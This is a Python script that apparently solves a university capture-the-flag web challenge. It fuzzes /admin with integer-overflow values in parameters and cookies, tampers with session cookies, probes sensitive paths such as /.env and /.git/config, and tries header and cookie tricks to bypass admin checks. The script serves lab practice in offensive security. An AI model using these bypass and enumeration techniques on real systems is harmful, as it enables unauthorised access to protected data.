#!/usr/bin/env python3
"""
Token Overflow Challenge - Integer Overflow Attack
==================================================

Challenge URL: http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080

This is an INTEGER OVERFLOW vulnerability challenge.
The application likely uses a token/counter that can be overflowed
to bypass access controls or gain elevated privileges.

Integer overflow occurs when:
- A value exceeds the maximum value for its data type
- Example: 32-bit signed int max = 2,147,483,647
- Adding 1 causes overflow to -2,147,483,648

Common scenarios:
1. Session ID overflow
2. User ID overflow  
3. Access token counter overflow
4. Balance/credits overflow

"""

import requests
import re
import sys


def test_integer_overflow():
    """
    Test for integer overflow vulnerabilities in tokens/IDs.
    
    Try overflowing various numeric parameters to bypass access controls.
    """
    
    print("="*70)
    print("INTEGER OVERFLOW ATTACK - TOKEN MANIPULATION")
    print("="*70)
    print()
    
    base_url = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"
    
    # Common integer boundaries to test
    overflow_values = [
        # 32-bit signed integer
        ("32-bit int max", 2147483647),
        ("32-bit int max + 1", 2147483648),
        ("32-bit int overflow", -2147483648),
        
        # 16-bit signed integer  
        ("16-bit int max", 32767),
        ("16-bit int max + 1", 32768),
        ("16-bit int overflow", -32768),
        
        # 8-bit unsigned
        ("8-bit max", 255),
        ("8-bit max + 1", 256),
        
        # Other common values
        ("Max safe integer (JS)", 9007199254740991),
        ("Negative wrap", -1),
        ("Zero", 0),
        ("Large negative", -999999),
    ]
    
    print("[*] Testing integer overflow on various parameters...")
    print()
    
    all_flags = set()
    
    # Test different parameter names
    param_names = ['token', 'id', 'user_id', 'session', 'uid', 'access', 'level', 'role']
    
    for param_name in param_names:
        for desc, value in overflow_values:
            # Test as URL parameter
            try:
                url = f"{base_url}/admin?{param_name}={value}"
                response = requests.get(url, timeout=5)
                
                flags = re.findall(r'CTF\{[^}]+\}', response.text)
                if flags:
                    print(f"[+] Parameter: {param_name}={value} ({desc})")
                    print(f"    URL: {url}")
                    print(f"    Status: {response.status_code}")
                    for flag in flags:
                        if flag not in all_flags:
                            print(f"    🚩 {flag}")
                            all_flags.add(flag)
                    print()
                    
            except Exception:
                pass
            
            # Test as cookie
            try:
                cookies = {param_name: str(value)}
                response = requests.get(f"{base_url}/admin", cookies=cookies, timeout=5)
                
                flags = re.findall(r'CTF\{[^}]+\}', response.text)
                if flags:
                    print(f"[+] Cookie: {param_name}={value} ({desc})")
                    print(f"    Status: {response.status_code}")
                    for flag in flags:
                        if flag not in all_flags:
                            print(f"    🚩 {flag}")
                            all_flags.add(flag)
                    print()
                    
            except Exception:
                pass
    
    return all_flags


def test_token_manipulation():
    """
    Test token manipulation by incrementing/decrementing token values.
    """
    
    print("="*70)
    print("TOKEN INCREMENT/DECREMENT ATTACK")
    print("="*70)
    print()
    
    base_url = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"
    
    print("[*] Getting initial session...")
    
    session = requests.Session()
    response = session.get(base_url)
    
    print(f"[*] Cookies received: {session.cookies.get_dict()}")
    print()
    
    all_flags = set()
    
    # If we have a numeric cookie, try manipulating it
    for cookie_name, cookie_value in session.cookies.items():
        if cookie_value.isdigit():
            original_value = int(cookie_value)
            print(f"[+] Found numeric cookie: {cookie_name} = {original_value}")
            print()
            
            # Test various manipulations
            test_values = [
                original_value - 1,
                original_value + 1,
                0,
                -1,
                999999,
                2147483647,  # Max int
                -2147483648, # Min int
            ]
            
            for test_val in test_values:
                try:
                    test_cookies = session.cookies.copy()
                    test_cookies.set(cookie_name, str(test_val))
                    
                    response = requests.get(f"{base_url}/admin", cookies=test_cookies, timeout=5)
                    
                    if response.status_code == 200:
                        flags = re.findall(r'CTF\{[^}]+\}', response.text)
                        if flags:
                            print(f"[+] Success with {cookie_name}={test_val}")
                            for flag in flags:
                                if flag not in all_flags:
                                    print(f"    🚩 {flag}")
                                    all_flags.add(flag)
                            print()
                            
                except Exception:
                    pass
    
    return all_flags


def find_all_flags():
    """Comprehensive flag hunter."""
    
    print("="*70)
    print("ENDPOINT ENUMERATION")
    print("="*70)
    print()
    
    base_url = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"
    
    all_flags = {}
    
    # Test all endpoints
    endpoints_to_test = [
        ('/', 'Homepage'),
        ('/profile', 'Profile Page'),
        ('/admin', 'Admin Portal'),
        ('/login', 'Login Page'),
        ('/logout', 'Logout'),
        ('/robots.txt', 'Robots.txt'),
        ('/.git/config', 'Git Config'),
        ('/flag', 'Flag Endpoint'),
        ('/secret', 'Secret'),
        ('/debug', 'Debug'),
        ('/api', 'API'),
        ('/token', 'Token'),
        ('/config', 'Config'),
        ('/backup', 'Backup'),
        ('/.env', 'Environment'),
        ('/admin.php', 'Admin PHP'),
        ('/flag.txt', 'Flag.txt'),
    ]
    
    print(f"[*] Scanning {len(endpoints_to_test)} endpoints...")
    print()
    
    for endpoint, description in endpoints_to_test:
        try:
            url = base_url + endpoint
            response = requests.get(url, allow_redirects=False, timeout=5)
            
            # Find all CTF flags
            flags = re.findall(r'CTF\{[^}]+\}', response.text)
            
            if flags:
                print(f"[+] {description} ({endpoint})")
                print(f"    Status: {response.status_code}")
                for flag in flags:
                    if flag not in all_flags:
                        all_flags[flag] = (endpoint, description)
                        print(f"    🚩 {flag}")
                print()
            elif response.status_code not in [403, 404, 500]:
                print(f"[~] {description} ({endpoint}) - {response.status_code} - No flags")
                
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            pass
    
    return all_flags


def analyze_admin_access():
    """Try to access admin panel with various techniques."""
    
    print("="*70)
    print("ADMIN ACCESS ATTEMPTS")
    print("="*70)
    print()
    
    base_url = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"
    
    techniques = [
        ("Direct access", {}, {}),
        ("X-Forwarded-For localhost", {}, {"X-Forwarded-For": "127.0.0.1"}),
        ("X-Original-URL", {}, {"X-Original-URL": "/admin"}),
        ("Admin cookie", {"admin": "true", "role": "admin"}, {}),
        ("Access-Control header", {}, {"Access-Control-Allow-Origin": "*"}),
    ]
    
    for name, cookies, headers in techniques:
        try:
            response = requests.get(
                f"{base_url}/admin", 
                cookies=cookies, 
                headers=headers,
                allow_redirects=False
            )
            
            print(f"[*] {name}")
            print(f"    Status: {response.status_code}")
            
            flags = re.findall(r'CTF\{[^}]+\}', response.text)
            if flags:
                print(f"    🚩 FLAGS: {flags}")
            elif response.status_code == 200:
                print(f"    Response preview: {response.text[:200]}")
            print()
            
        except Exception as e:
            print(f"[-] {name} - Error: {e}")
            print()


def check_source_code_hints():
    """Look for hints in JavaScript and HTML comments."""
    
    print("="*70)
    print("SOURCE CODE ANALYSIS")
    print("="*70)
    print()
    
    base_url = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"
    
    response = requests.get(base_url)
    html = response.text
    
    # Check for comments
    print("[*] HTML Comments:")
    comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
    if comments:
        for i, comment in enumerate(comments, 1):
            comment_text = comment.strip()
            if comment_text and len(comment_text) > 5:
                print(f"    Comment {i}: {comment_text[:100]}")
    else:
        print("    None found")
    print()
    
    # Check for JavaScript variables
    print("[*] Interesting JavaScript Variables:")
    js_vars = re.findall(r'(var|let|const)\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
    for var_type, var_name, var_value in js_vars:
        if any(keyword in var_name.lower() for keyword in ['token', 'key', 'secret', 'flag', 'admin']):
            print(f"    {var_name} = '{var_value}'")
    print()
    
    # Check for data attributes
    print("[*] Data Attributes:")
    data_attrs = re.findall(r'data-[\w-]+=["\']([^"\']+)["\']', html)
    if data_attrs:
        for attr in data_attrs[:10]:
            print(f"    {attr}")
    else:
        print("    None found")
    print()


def main():
    """Main function."""
    
    print()
    print("  ╔╦╗╔═╗╦╔═╔═╗╔╗╔  ╔═╗╦  ╦╔═╗╦═╗╔═╗╦  ╔═╗╦ ╦")
    print("   ║ ║ ║╠╩╗║╣ ║║║  ║ ║╚╗╔╝║╣ ╠╦╝╠╣ ║  ║ ║║║║")
    print("   ╩ ╚═╝╩ ╩╚═╝╝╚╝  ╚═╝ ╚╝ ╚═╝╩╚═╚  ╩═╝╚═╝╚╩╝")
    print("        Complete Flag Collection")
    print()
    
    # Find all flags
    all_flags = find_all_flags()
    
    # Try admin access
    analyze_admin_access()
    
    # Check source code
    check_source_code_hints()
    
    # Final summary
    print("="*70)
    print(f"FINAL SUMMARY - {len(all_flags)} UNIQUE FLAGS FOUND")
    print("="*70)
    print()
    
    if all_flags:
        for i, (flag, (endpoint, description)) in enumerate(sorted(all_flags.items()), 1):
            print(f"{i}. 🚩 {flag}")
            print(f"   Found in: {description} ({endpoint})")
            print()
    else:
        print("No flags found!")
    
    print("="*70)


if __name__ == "__main__":
    all_flags = set()
    
    # Try integer overflow attacks first
    print("STEP 1: Testing Integer Overflow Attacks")
    print("="*70)
    overflow_flags = test_integer_overflow()
    all_flags.update(overflow_flags)
    
    print("\n" * 2)
    
    # Try token manipulation
    print("STEP 2: Testing Token Manipulation")
    print("="*70)
    token_flags = test_token_manipulation()
    all_flags.update(token_flags)
    
    print("\n" * 2)
    
    # Also run original endpoint scan
    print("STEP 3: Original Endpoint Scan")
    print("="*70)
    main()
    
    print("\n" * 2)
    print("="*70)
    print("INTEGER OVERFLOW ATTACK SUMMARY")
    print("="*70)
    for flag in sorted(all_flags):
        print(f"🚩 {flag}")
    print(f"\nTotal from overflow attacks: {len(all_flags)} flags")
